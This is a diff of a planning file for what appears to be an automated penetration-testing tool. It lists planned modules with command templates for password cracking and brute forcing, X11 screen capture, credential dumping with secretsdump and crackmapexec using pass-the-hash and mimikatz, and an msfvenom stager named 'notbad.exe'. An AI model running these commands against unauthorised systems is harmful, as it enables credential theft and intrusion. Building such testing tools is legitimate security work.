@@ -6,8 +6,7 @@ Modules:
     #1 address all TDODs in the current modules
     #2 make sure all modules contribute to the reporting
     #3 fix any issues in current modules
-    #4 make new ReportModule abstract class that all reporting modules will extend
-    #5 new modules
+    #4 new modules
         *1) password cracking:   john, hashcat
         *2) password testing:    hydra, medusa
         3) possibly use Impacket's psexec.py to open windows shells
@@ -15,10 +14,9 @@ Modules:
         5) ipmi tests:  ipmitool, msf
         6) snmp tests:  << nmap -sU -p161 --script=snmp-brute [targets] >>, snmpwalk
         *7) X11 testing and screenshots:  xwd -root -screen -silent -display [target]:0 | xwdtopnm | pnmtopng > [target].png
-        *8) run secretsdump.py on all windows systems for all usercreds: secretsdump.py [user]:[password]@[target]
-        9) run crackmapexec.py on all windows systems for all usercreds:    ./crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash] --mimikatz
-        10) nmap test telnet services:  nmap -p23 --script=telnet-brute [targets]
-        11) possibly use msfvenom to use to push to systems:   msfvenom -p auxiliary/pro/generate_dynamic_stager host=[LOCAL IP] port=[LOCAL PORT] -f exe > notbad.exe
+        8) run crackmapexec.py on all windows systems for all usercreds:    ./crackmapexec.py [target] -d WORKGROUP -u [user] -H [hash] --mimikatz
+        9) nmap test telnet services:  nmap -p23 --script=telnet-brute [targets]
+        10) possibly use msfvenom to use to push to systems:   msfvenom -p auxiliary/pro/generate_dynamic_stager host=[LOCAL IP] port=[LOCAL PORT] -f exe > notbad.exe
 
 CURRENT MODULES:
     anonftp                   Test for Anonymous FTP
